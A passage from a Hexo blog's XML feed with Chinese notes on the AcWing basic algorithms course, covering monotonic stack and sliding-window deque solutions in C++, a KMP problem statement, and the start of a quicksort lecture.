class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个整数，其中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数表示第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 个数的左边第一个比它小的数，如果不存在则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span></span></span></span>。</p><h4 id="数据范围-4">数据范围</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mtext>数列中元素</mtext><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \le 数列中元素 \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">数列中元素</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><h4 id="输入样例：-4">输入样例：</h4><pre><code>53 4 2 7 5</code></pre><h4 id="输出样例：-4">输出样例：</h4><pre><code>-1 3 -1 2 2</code></pre><h3 id="单调栈-2">单调栈</h3><h4 id="STL版本">STL版本</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stk.<span class="built_in">size</span>() &amp;&amp; stk.<span class="built_in">top</span>() &gt;= x) stk.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (stk.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, stk.<span class="built_in">top</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组模拟版本">数组模拟版本</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> stk[kN], tt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">    <span class="keyword">while</span> (tt &amp;&amp; stk[tt] &gt;= x) tt--;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (tt? stk[tt]: <span class="number">-1</span>));</span><br><span class="line">    stk[++tt] = x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="单调队列">单调队列</h1><h2 id="AcWing-154-滑动窗口"><a href="acwing.com/problem/content/156/">AcWing 154. 滑动窗口</a></h2><p>给定一个大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">n \le 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span> 的数组。</p><p>有一个大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 的滑动窗口，它从数组的最左边移动到最右边。</p><p>你只能在窗口中看到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 个数字。</p><p>每次滑动窗口向右移动一个位置。</p><p>以下是一个例子：</p><p>该数组为 <code>[1 3 -1 -3 5 3 6 7]</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>。</p><table><thead><tr><th style="text-align:center">窗口位置</th><th style="text-align:center">最小值</th><th style="text-align:center">最大值</th></tr></thead><tbody><tr><td style="text-align:center">[1 3 -1] -3 5 3 6 7</td><td style="text-align:center">-1</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">1 [3 -1 -3] 5 3 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">3</td></tr><tr><td style="text-align:center">1 3 [-1 -3 5] 3 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">1 3 -1 [-3 5 3] 6 7</td><td style="text-align:center">-3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center">1 3 -1 -3 [5 3 6] 7</td><td style="text-align:center">3</td><td style="text-align:center">6</td></tr><tr><td style="text-align:center">1 3 -1 -3 5 [3 6 7]</td><td style="text-align:center">3</td><td style="text-align:center">7</td></tr></tbody></table><p>你的任务是确定滑动窗口位于每个位置时，窗口中的最大值和最小值。</p><h4 id="输入格式-5">输入格式</h4><p>输入包含两行。</p><p>第一行包含两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，分别代表数组长度和滑动窗口的长度。</p><p>第二行有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，代表数组的具体数值。</p><p>同行数据之间用空格隔开。</p><h4 id="输出格式-5">输出格式</h4><p>输出包含两个。</p><p>第一行输出，从左至右，每个位置滑动窗口中的最小值。</p><p>第二行输出，从左至右，每个位置滑动窗口中的最大值。</p><h4 id="输入样例：-5">输入样例：</h4><pre><code>8 31 3 -1 -3 5 3 6 7</code></pre><h4 id="输出样例：-5">输出样例：</h4><pre><code>-1 -3 -3 -3 3 33 3 5 5 6 7</code></pre><h3 id="单调队列-2">单调队列</h3><p>单调栈/队列题思路：</p><ol><li>先用暴力实现, 用栈/队列模拟</li><li>删除无用元素</li><li>有无单调性, 进行优化(比如查找问题用二分, 极值问题取端点)</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> a[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, k;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  </span><br><span class="line">  deque&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; a[q.<span class="built_in">back</span>()] &gt;= a[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">    q.<span class="built_in">push_back</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">    <span class="comment">// if (q.size() &gt; k) q.pop_front();  // 不对喔, 单调队列中很多值pop_back掉了</span></span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q.<span class="built_in">front</span>()]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  q.<span class="built_in">clear</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; a[q.<span class="built_in">back</span>()] &lt;= a[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">    q.<span class="built_in">push_back</span>(i);</span><br><span class="line">    <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q.<span class="built_in">front</span>()]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="KMP">KMP</h1><p>给定一个字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>，以及一个模式串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，所有字符串中只包含大小写英文字母以及阿拉伯数字。</p><p>模式串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> 在字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中多次作为子串出现。</p><p>求出模式串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> 在字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中所有出现的位置的起始下标。</p><h4 id="输入格式-6">输入格式</h4><p>第一行输入整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span> 的长度。</p><p>第二行输入字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>。</p><p>第三行输入整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 的长度。</p><p>第四行输入字符串 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>。</p><h4 id="输出格式-6">输出格式</h4><p>共一行，输出所有出现位置的起始下标（下标从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 开始计数），整数之间用空格隔开。</p><h4 id="数据范围-5">数据范围</h4><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1 \le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>M</mi><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>6</mn></msup></mrow><annotation encoding="application/x-tex">1 \le M \le 10^6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></p><h4 id="输入样例：-6">输入样例：</h4><pre><code>3aba5ababa</code></pre><h4 id="输出样例：-6">输出样例：</h4><pre><code>0 2</code></pre><h1 id="Trie">Trie</h1><h1 id="并查集">并查集</h1><h1 id="堆">堆</h1><h1 id="哈希表">哈希表</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> AcWing算法基础课 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>butterfly目录显示异常问题及解决方案</title>
      <link href="/2022/12/25/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-butterfly%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2022/12/25/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-butterfly%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>笔者之前体验过 <code>NexT</code> 主题，由于</p>]]></content>
      
      
      <categories>
          
          <category> 踩坑记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1讲 基础算法</title>
      <link href="/2022/12/25/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-1-%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"/>
      <url>/2022/12/25/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE-1-%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>本讲代码模板：<a href="https://www.acwing.com/blog/content/277/">https://www.acwing.com/blog/content/277/</a></p><span id="more"></span><h1 id="快速排序">快速排序</h1><h2 id="AcWing-785-快速排序"><a href="https://www.acwing.com/problem/content/787/">AcWing 785. 快速排序</a></h2><p>给定你一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的整数数列。</p><p>请你使用快速排序对这个数列按照从小到大进行排序。</p><p>并将排好序的数列按顺序输出。</p><p><strong>输入格式</strong></p><p>输入共两行，第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数（所有整数均在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">1 \sim 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span> 范围内），表示整个数列。</p><p><strong>输出格式</strong></p><p>输出共一行，包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数，表示排好序的数列。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 